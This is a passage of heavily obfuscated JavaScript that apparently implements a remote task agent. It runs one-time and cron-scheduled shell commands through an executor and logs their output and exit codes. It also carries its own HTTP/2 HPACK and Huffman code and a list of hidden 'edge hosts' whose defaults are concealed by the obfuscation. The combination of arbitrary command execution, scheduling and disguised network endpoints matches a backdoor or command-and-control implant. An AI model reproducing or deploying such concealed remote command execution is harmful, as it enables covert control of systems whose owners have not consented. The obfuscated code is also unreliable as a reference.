        for (let d = 0x0; b[cA(0x5de)](d, a0P[cA(0x3ea)][cA(0x650)]); d++) {
            const f = a0P[cA(0x3ea)][d], g = await a0V['execute'](f), h = this[cA(0x779)](f, g[cA(0x1e0)], g['exitcode'], b[cA(0x319)]);
            this[cA(0x5a2)](a0P[cA(0x20d)], h), c[cA(0x24a)]({
                'index': d,
                'cmd': f,
                'exitcode': g[cA(0x211)],
                'output': g['result'],
                'status': g['exitcode'] === 0x0 ? 'ok' : b['ToAGH']
            });
        }
        return a0P[cA(0x569)] = ![], {
            'status': 'ok',
            'count': a0P['onetasks'][cA(0x650)],
            'tasks': a0P[cA(0x3ea)],
            'executed': c
        };
    }
    static [a0aW(0x435)]() {
        const cB = a0aW;
        return {
            'status': 'ok',
            'count': Object['keys'](a0P[cB(0x683)])['length'],
            'tasks': a0P[cB(0x683)]
        };
    }
    static [a0aW(0x5a5)](a) {
        const cC = a0aW, b = {
                'rHbod': function (d, f) {
                    return d === f;
                },
                'xDksA': cC(0x5c7),
                'sbFqd': cC(0x481),
                'gNHYI': function (d, f) {
                    return d > f;
                },
                'SGyho': cC(0x5e7),
                'cXfBq': function (d, f) {
                    return d || f;
                },
                'GrTKD': function (d, f) {
                    return d > f;
                }
            };
        this[cC(0x5ed)][cC(0x35d)](d => {
            const cD = cC;
            b[cD(0x69e)](typeof d['stop'], b['xDksA']) && d[cD(0x339)](), b[cD(0x69e)](typeof d[cD(0x2ef)], b[cD(0x1a4)]) && d[cD(0x2ef)]();
        }), this[cC(0x5ed)]['clear']();
        const c = [];
        for (const d of Object[cC(0x551)](a || {})) {
            !a0t[cC(0x1b3)](d) && c['push'](d);
        }
        if (b[cC(0x3fa)](c['length'], 0x0))
            return {
                'status': b[cC(0x4a3)],
                'message': cC(0x3a3) + c['join'](',\x20'),
                'valid_count': Object[cC(0x551)](b[cC(0x3fb)](a, {}))[cC(0x650)] - c[cC(0x650)]
            };
        a0P[cC(0x683)] = b[cC(0x3fb)](a, {});
        for (const [f, g] of Object[cC(0x207)](a0P[cC(0x683)])) {
            const h = a0t['schedule'](f, async () => {
                const cE = cC, i = await a0V[cE(0x2d2)](g), j = this[cE(0x779)](g, i[cE(0x1e0)], i[cE(0x211)], b['sbFqd'], f);
                this[cE(0x5a2)](a0P[cE(0x3d4)], j);
            });
            this['cronJobs'][cC(0x5ef)](f, h);
        }
        return a0P[cC(0x30d)] = b[cC(0x1a2)](Object[cC(0x551)](a0P['crontasks'])['length'], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0P[cC(0x683)])[cC(0x650)],
            'tasks': a0P[cC(0x683)]
        };
    }
    static ['getTaskStatus']() {
        const cF = a0aW;
        return {
            'onetime': {
                'pending': a0P[cF(0x569)],
                'count': a0P[cF(0x3ea)][cF(0x650)]
            },
            'cron': {
                'active': a0P[cF(0x30d)],
                'count': Object[cF(0x551)](a0P[cF(0x683)])[cF(0x650)],
                'check_interval': a0P[cF(0x763)]
            }
        };
    }
    static [a0aW(0x37a)](a = 0x32) {
        const cG = a0aW, b = a0P[cG(0x20d)][cG(0x500)](-a);
        return {
            'status': 'ok',
            'count': b[cG(0x650)],
            'logs': b
        };
    }
    static [a0aW(0x393)](a = 0x32) {
        const cH = a0aW, b = a0P[cH(0x3d4)][cH(0x500)](-a);
        return {
            'status': 'ok',
            'count': b[cH(0x650)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cI = a0aW, a = { 'ThaWq': 'onetime' }, b = a0P[cI(0x20d)]['length'];
        return a0P['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a[cI(0x701)]
        };
    }
    static ['clearCronLogs']() {
        const cJ = a0aW, a = { 'RSOGG': cJ(0x481) }, b = a0P['crontasks_log'][cJ(0x650)];
        return a0P['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a[cJ(0x827)]
        };
    }
    static [a0aW(0x83c)]() {
        const cK = a0aW, a = {
                'PZPSZ': function (g, h) {
                    return g - h;
                },
                'ffMvN': function (g, h) {
                    return g - h;
                }
            }, b = a0P[cK(0x20d)][cK(0x3cc)](g => g[cK(0x211)] === 0x0)[cK(0x650)], c = a[cK(0x800)](a0P[cK(0x20d)][cK(0x650)], b), d = a0P[cK(0x3d4)][cK(0x3cc)](g => g['exitcode'] === 0x0)[cK(0x650)], f = a[cK(0x73d)](a0P[cK(0x3d4)][cK(0x650)], d);
        return {
            'onetime': {
                'total_logged': a0P[cK(0x20d)]['length'],
                'max_capacity': a0P[cK(0x3f3)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P[cK(0x3d4)][cK(0x650)],
                'max_capacity': a0P[cK(0x3f3)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aW(0x559)]() {
        const cL = a0aW, a = {
                'jGflI': function (c, d) {
                    return c < d;
                },
                'ycVMA': cL(0x24b)
            }, b = [];
        for (let c = 0x0; a['jGflI'](c, a0P['onetasks'][cL(0x650)]); c++) {
            const d = a0P[cL(0x3ea)][c], f = await a0V[cL(0x2d2)](d), g = this[cL(0x779)](d, f[cL(0x1e0)], f[cL(0x211)], a['ycVMA']);
            this[cL(0x5a2)](a0P[cL(0x20d)], g), b[cL(0x24a)]({
                'cmd': d,
                'exitcode': f['exitcode'],
                'output': f['result'],
                'timeout': f[cL(0x5c8)]
            });
        }
        return a0P[cL(0x569)] = ![], {
            'status': 'ok',
            'executed': b[cL(0x650)],
            'results': b
        };
    }
}
const a0a0 = a0aW(0x24f), a0a1 = ((() => {
        const cM = a0aW, a = {
                'wtneY': function (c, d) {
                    return c > d;
                },
                'xjCnN': cM(0x6cf)
            }, b = String(process.env.KISAMA_EDGE_HOSTS || '')['split'](',')[cM(0x7d9)](c => c[cM(0x343)]())[cM(0x3cc)](Boolean);
        return a[cM(0x14e)](b[cM(0x650)], 0x0) ? b : [
            a[cM(0x250)],
            cM(0x360)
        ];
    })()), a0a2 = 0x1ea4, a0a3 = a0aW(0x651), a0a4 = a0aW(0x412), a0a5 = 0x4000, a0a6 = [
        [
            a0aW(0x886),
            ''
        ],
        [
            a0aW(0x4b4),
            'GET'
        ],
        [
            a0aW(0x4b4),
            a0aW(0x756)
        ],
        [
            ':path',
            '/'
        ],
        [
            a0aW(0x614),
            a0aW(0x5e0)
        ],
        [
            a0aW(0x462),
            a0aW(0x28d)
        ],
        [
            ':scheme',
            a0aW(0x1bf)
        ],
        [
            a0aW(0x44b),
            '200'
        ],
        [
            ':status',
            '204'
        ],
        [
            a0aW(0x44b),
            a0aW(0x2d5)
        ],
        [
            a0aW(0x44b),
            a0aW(0x18f)
        ],
        [
            ':status',
            '400'
        ],
        [
            ':status',
            a0aW(0x4fd)
        ],
        [
            a0aW(0x44b),
            a0aW(0x384)
        ],
        [
            'accept-charset',
            ''
        ],
        [
            a0aW(0x3e3),
            a0aW(0x6e1)
        ],
        [
            a0aW(0x71a),
            ''
        ],
        [
            a0aW(0x7b7),
            ''
        ],
        [
            a0aW(0x510),
            ''
        ],
        [
            a0aW(0x55a),
            ''
        ],
        [
            a0aW(0x44d),
            ''
        ],
        [
            a0aW(0x31d),
            ''
        ],
        [
            a0aW(0x48e),
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            a0aW(0x401),
            ''
        ],
        [
            a0aW(0x60e),
            ''
        ],
        [
            'content-length',
            ''
        ],
        [
            a0aW(0x2a9),
            ''
        ],
        [
            a0aW(0x624),
            ''
        ],
        [
            a0aW(0x1be),
            ''
        ],
        [
            'cookie',
            ''
        ],
        [
            a0aW(0x22f),
            ''
        ],
        [
            a0aW(0x5ad),
            ''
        ],
        [
            a0aW(0x66e),
            ''
        ],
        [
            'expires',
            ''
        ],
        [
            a0aW(0x7e4),
            ''
        ],
        [
            a0aW(0x239),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0aW(0x5ea),
            ''
        ],
        [
            a0aW(0x18d),
            ''
        ],
        [
            a0aW(0x6fe),
            ''
        ],
        [
            a0aW(0x51c),
            ''
        ],
        [
            a0aW(0x5b1),
            ''
        ],
        [
            'link',
            ''
        ],
        [
            'location',
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            'proxy-authenticate',
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0aW(0x1b9),
            ''
        ],
        [
            a0aW(0x74f),
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0aW(0x77b),
            ''
        ],
        [
            a0aW(0x6fd),
            ''
        ],
        [
            a0aW(0x82e),
            ''
        ],
        [
            'strict-transport-security',
            ''
        ],
        [
            a0aW(0x498),
            ''
        ],
        [
            'user-agent',
            ''
        ],
        [
            a0aW(0x47f),
            ''
        ],
        [
            a0aW(0x437),
            ''
        ],
        [
            a0aW(0x23c),
            ''
        ]
    ], a0a7 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a8 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a9() {
    const cN = a0aW, a = {
            'WERnD': function (c, d) {
                return c < d;
            },
            'drQsj': function (c, d) {
                return c - d;
            },
            'VCNay': function (c, d) {
                return c & d;
            },
            'fdvsy': function (c, d) {
                return c >> d;
            },
            'Vnjnq': function (c, d) {
                return c === d;
            },
            'krhFr': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[cN(0x2b8)](c, a0a7[cN(0x650)]); c++) {
        const d = a0a7[c], f = a0a8[c];
        let g = b;
        for (let h = a[cN(0x5a6)](f, 0x1); h >= 0x0; h--) {
            const i = a[cN(0x336)](a[cN(0x69b)](d, h), 0x1);
            a[cN(0x774)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cN(0x269)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0aa = a0a9();
function a0ab(a) {
    const cO = a0aW, b = {
            'ClmCS': function (h, i) {
                return h >= i;
            },
            'pvjri': function (h, i) {
                return h & i;
            },
            'qOIXp': function (h, i) {
                return h >> i;
            },
            'FUlcP': function (h, i) {
                return h | i;
            },
            'wWHLG': function (h, i) {
                return h === i;
            },
            'zIpQc': cO(0x301),
            'VJIuc': cO(0x704),
            'BrIiU': cO(0x165),
            'PlGfp': function (h, i) {
                return h > i;
            },
            'GUIaL': function (h, i) {
                return h !== i;
            },
            'IgMZW': function (h, i) {
                return h << i;
            },
            'HkNDb': cO(0x386)
        }, c = [];
    let d = a0aa, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[cO(0x521)](i, 0x0); i--) {
            const j = b[cO(0x25f)](b[cO(0x5ce)](h, i), 0x1);
            f = b[cO(0x1f3)](f << 0x1, j), g += 0x1, d = d[j];
            if (b[cO(0x5a7)](d, null))
                throw new Error(b[cO(0x2fc)]);
            if (d[0x2] >= 0x0) {
                const k = b[cO(0x43a)]['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        if (d[0x2] === 0x100)
                            throw new Error(b[cO(0x625)]);
                        continue;
                    case '1':
                        c['push'](d[0x2]);
                        continue;
                    case '2':
                        d = a0aa;
                        continue;
                    case '3':
                        f = 0x0;
                        continue;
                    case '4':
                        g = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[cO(0x184)](g, 0x7) || b[cO(0x21e)](f, b['IgMZW'](0x1, g) - 0x1))
        throw new Error(b[cO(0x7e2)]);
    return Buffer[cO(0x7e4)](c);
}
function a0ac(a, b, c) {
    const cP = a0aW, d = {
            'ujjAM': function (j, k) {
                return j >= k;
            },
            'hFPAL': cP(0x3cd),
            'MuDvn': function (j, k) {
                return j - k;
            },
            'YYhdS': function (j, k) {
                return j << k;
            },
            'lvclI': function (j, k) {
                return j & k;
            },
            'XnpXL': function (j, k) {
                return j === k;
            },
            'lTGwY': function (j, k) {
                return j > k;
            },
            'eyhUI': cP(0x806)
        };
    if (d['ujjAM'](b, a[cP(0x650)]))
        throw new Error(d[cP(0x7f2)]);
    const f = a[b];
    b += 0x1;
    const g = d[cP(0x1ea)](d['YYhdS'](0x1, c), 0x1);
    let h = d[cP(0x364)](f, g);
    if (h < g)
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[cP(0x6e9)](b, a[cP(0x650)]))
            throw new Error(d['hFPAL']);
        const j = a[b];
        b += 0x1, h += d[cP(0x364)](j, 0x7f) * Math[cP(0x29f)](0x2, i);
        if (d[cP(0x794)](j & 0x80, 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d['lTGwY'](i, 0x1c))
            throw new Error(d['eyhUI']);
    }
}
function a0ad(a, b) {
    const cQ = a0aW, c = {
            'sxpgc': cQ(0x876),
            'bqhnx': function (j, k) {
                return j(k);
            },
            'NmTqv': function (j, k) {
                return j & k;
            },
            'SycVG': function (j, k, l, m) {
                return j(k, l, m);
            },
            'qurxG': function (j, k) {
                return j > k;
            },
            'LUZnZ': cQ(0x7c2)
        };
    if (b >= a[cQ(0x650)])
        throw new Error(c[cQ(0x2f2)]);
    const d = c[cQ(0x627)](Boolean, c[cQ(0x252)](a[b], 0x80)), [f, g] = c['SycVG'](a0ac, a, b, 0x7), h = g + f;
    if (c[cQ(0x206)](h, a[cQ(0x650)]))
        throw new Error(c[cQ(0x4d5)]);
    const i = a[cQ(0x6a7)](g, h);
    return [
        d ? c[cQ(0x627)](a0ab, i) : i,
        h
    ];
}
class a0ae {
    constructor() {
        const cR = a0aW;
        this['dynamic'] = [], this[cR(0x51e)] = 0x0, this[cR(0x818)] = 0x1000;
    }
    [a0aW(0x2b3)](a) {
        const cS = a0aW, b = {
                'ocsQX': cS(0x22a),
                'DwFjo': function (d, f) {
                    return d - f;
                },
                'TcvZW': function (d, f) {
                    return d - f;
                },
                'SigLs': function (d, f) {
                    return d < f;
                }
            };
        if (a <= 0x0)
            throw new Error(b[cS(0x567)]);
        if (a <= a0a6['length'])
            return a0a6[b['DwFjo'](a, 0x1)];
        const c = b[cS(0x337)](b[cS(0x602)](a, a0a6[cS(0x650)]), 0x1);
        if (b[cS(0x700)](c, 0x0) || c >= this[cS(0x1de)][cS(0x650)])
            throw new Error('HPACK\x20dynamic\x20index\x20out\x20of\x20range');
        return this[cS(0x1de)][c];
    }
    ['add'](a, b) {
        const cT = a0aW, c = {
                'JCLbu': function (f, g) {
                    return f + g;
                },
                'zQcvr': function (f, g) {
                    return f + g;
                },
                'lTpZU': cT(0x736),
                'YpIaD': function (f, g) {
                    return f > g;
                },
                'gZsaj': function (f, g) {
                    return f > g;
                },
                'IneFo': function (f, g) {
                    return f + g;
                }
            }, d = c[cT(0x45d)](c['zQcvr'](0x20, Buffer['byteLength'](a, c[cT(0x765)])), Buffer[cT(0x16e)](b, c[cT(0x765)]));
        if (c[cT(0x203)](d, this['maxSize'])) {
            this[cT(0x1de)] = [], this[cT(0x51e)] = 0x0;
            return;
        }
        while (c[cT(0x244)](this[cT(0x1de)][cT(0x650)], 0x0) && c['YpIaD'](c[cT(0x785)](this['dynamicSize'], d), this[cT(0x818)])) {
            const [f, g] = this[cT(0x1de)][cT(0x452)]();
            this[cT(0x51e)] -= c[cT(0x836)](0x20 + Buffer[cT(0x16e)](f, c['lTpZU']), Buffer[cT(0x16e)](g, c[cT(0x765)]));
        }
        this[cT(0x1de)]['unshift']([
            a,
            b
        ]), this[cT(0x51e)] += d;
    }
    [a0aW(0x305)](a) {
        const cU = a0aW, b = {
                'MDjJp': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'FwTxP': function (f, g) {
                    return f & g;
                },
                'qIGWw': function (f, g, h) {
                    return f(g, h);
                },
                'wRhYB': cU(0x736),
                'YMEaT': function (f, g, h) {
                    return f(g, h);
                },
                'NHxfL': function (f, g) {
                    return f & g;
                },
                'EaLsK': function (f, g) {
                    return f > g;
                },
                'jRqap': cU(0x310),
                'QKcom': function (f, g) {
                    return f > g;
                },
                'XbQLR': function (f, g) {
                    return f + g;
                },
                'KJlBR': function (f, g, h, i) {
                    return f(g, h, i);
                }
            }, c = [];
        let d = 0x0;
        while (d < a[cU(0x650)]) {
            const f = a[d];
            if (f & 0x80) {
                let j;
                [j, d] = b[cU(0x869)](a0ac, a, d, 0x7), c[cU(0x24a)](this[cU(0x2b3)](j));
                continue;
            }
            if (b[cU(0x31e)](f, 0x40)) {
                let k, l;
                [k, d] = a0ac(a, d, 0x6);
                if (k)
                    l = this[cU(0x2b3)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[cU(0x727)](a0ad, a, d), l = o[cU(0x491)](b[cU(0x1bb)])[cU(0x40a)]();
                }
                let m;
                [m, d] = b['YMEaT'](a0ad, a, d);
                const n = m[cU(0x491)](b[cU(0x1bb)]);
                this[cU(0x30f)](l, n), c[cU(0x24a)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[cU(0x6a4)](f, 0x20)) {
                let p;
                [p, d] = a0ac(a, d, 0x5);
                if (b[cU(0x512)](p, 0x1000))
                    throw new Error(b[cU(0x42e)]);
                this[cU(0x818)] = p;
                while (b['QKcom'](this['dynamic']['length'], 0x0) && b[cU(0x512)](this[cU(0x51e)], p)) {
                    const [q, r] = this[cU(0x1de)][cU(0x452)]();
                    this[cU(0x51e)] -= b['XbQLR'](0x20 + Buffer[cU(0x16e)](q, b[cU(0x1bb)]), Buffer[cU(0x16e)](r, cU(0x736)));
                }
                continue;
            }
            let g, h;
            [g, d] = b['KJlBR'](a0ac, a, d, 0x4);
            if (g)
                h = this[cU(0x2b3)](g)[0x0];
            else {
                let s;
                [s, d] = b[cU(0x727)](a0ad, a, d), h = s[cU(0x491)](b['wRhYB'])[cU(0x40a)]();
            }
            let i;
            [i, d] = a0ad(a, d), c[cU(0x24a)]([
                h,
                i[cU(0x491)](b[cU(0x1bb)])
            ]);
        }
        return c;
    }
}
function a0af(a, b, c) {
    const cV = a0aW, d = {
            'wVCeW': function (h, i) {
                return h - i;
            },
            'ORumb': function (h, i) {
                return h << i;
            },
            'jpyqG': function (h, i) {
                return h < i;
            },
            'XmdjN': function (h, i) {
                return h | i;
            },
            'grkAi': function (h, i) {
                return h | i;
            },
            'XmdPZ': function (h, i) {
                return h >= i;
            },
            'KlDuj': function (h, i) {
                return h | i;
            },
            'vUpDq': function (h, i) {
                return h / i;
            }
        }, f = d['wVCeW'](d[cV(0x1d4)](0x1, b), 0x1);
    if (d[cV(0x6d0)](a, f))
        return Buffer[cV(0x7e4)]([d['XmdjN'](c, a)]);
    const g = [d[cV(0x580)](c, f)];
    a -= f;
    while (d[cV(0x807)](a, 0x80)) {
        g[cV(0x24a)](d[cV(0x281)](a & 0x7f, 0x80)), a = Math[cV(0x695)](d['vUpDq'](a, 0x80));
    }
    return g[cV(0x24a)](a), Buffer[cV(0x7e4)](g);
}
function a0ag(a) {
    const cW = a0aW, b = { 'vvupu': cW(0x736) }, c = Buffer[cW(0x7e4)](a, b[cW(0x5ba)]);
    return Buffer['concat']([
        a0af(c[cW(0x650)], 0x7, 0x0),
        c
    ]);
}
function a0ah(a) {
    const cX = a0aW, b = {
            'livDG': cX(0x44b),
            'BlzGE': function (d, f) {
                return d === f;
            },
            'fsFvp': cX(0x7e5),
            'wPVRt': function (d, f) {
                return d === f;
            },
            'pZpww': cX(0x26f),
            'OzcJM': function (d, f) {
                return d === f;
            },
            'FMOSC': function (d, f) {
                return d === f;
            },
            'kIPpb': '404',
            'QqwtS': cX(0x384),
            'cxztx': function (d, f, g, h) {
                return d(f, g, h);
            },
            'NsTBR': function (d, f) {
                return d(f);
            },
            'sbfzb': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (d === b['livDG'] && b[cX(0x458)](f, b[cX(0x1a6)]))
            c[cX(0x24a)](0x88);
        else {
            if (b[cX(0x6b6)](d, b[cX(0x18e)]) && f === b[cX(0x1df)])
                c[cX(0x24a)](0x89);
            else {
                if (d === b['livDG'] && b[cX(0x458)](f, '206'))
                    c[cX(0x24a)](0x8a);
                else {
                    if (b[cX(0x19c)](d, b[cX(0x18e)]) && b['OzcJM'](f, '304'))
                        c['push'](0x8b);
                    else {
                        if (d === b[cX(0x18e)] && b[cX(0x1c9)](f, '400'))
                            c['push'](0x8c);
                        else {
                            if (d === ':status' && b[cX(0x19c)](f, b[cX(0x539)]))
                                c[cX(0x24a)](0x8d);
                            else
                                d === cX(0x44b) && b['wPVRt'](f, b['QqwtS']) ? c[cX(0x24a)](0x8e) : (c[cX(0x24a)](...b[cX(0x16f)](a0af, 0x0, 0x4, 0x0)), c[cX(0x24a)](...b['NsTBR'](a0ag, d)), c[cX(0x24a)](...b[cX(0x874)](a0ag, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer['from'](c);
}
class a0ai {
    constructor() {
        const cY = a0aW;
        this[cY(0x598)] = [];
    }
    [a0aW(0x605)](a) {
        const cZ = a0aW, b = {
                'bbTMp': function (d, f) {
                    return d < f;
                }
            }, c = this['words'][cZ(0x650)];
        for (let d = 0x0; b[cZ(0x721)](d, a); d++) {
            this[cZ(0x598)]['push'](0x0n);
        }
        return c;
    }
    ['structPtr'](a, b, c, d) {
        const d0 = a0aW, f = {
                'RfnZu': function (j, k) {
                    return j - k;
                },
                'ctFLi': function (j, k) {
                    return j - k;
                },
                'CSQwe': function (j, k) {
                    return j & k;
                },
                'bHZgZ': function (j, k) {
                    return j(k);
                },
                'cYtLH': function (j, k) {
                    return j << k;
                },
                'zZoMp': function (j, k) {
                    return j | k;
                },
                'Rbnee': function (j, k) {
                    return j << k;
                }
            }, g = f[d0(0x3ce)](f['ctFLi'](b, a), 0x1), h = f['CSQwe'](BigInt(g) << 0x2n, 0xfffffffcn), i = f['bHZgZ'](BigInt, f[d0(0x53f)](c, 0xffff)) | f[d0(0x395)](BigInt(f[d0(0x53f)](d, 0xffff)), 0x10n);
        this[d0(0x598)][a] = f[d0(0x3b3)](h, f['Rbnee'](i, 0x20n));
    }
    ['setU8'](a, b, c) {
        const d1 = a0aW, d = {
                'Bqern': function (g, h) {
                    return g << h;
                },
                'URLBA': function (g, h) {
                    return g(h);
                },
                'xLyQJ': function (g, h) {
                    return g * h;
                },
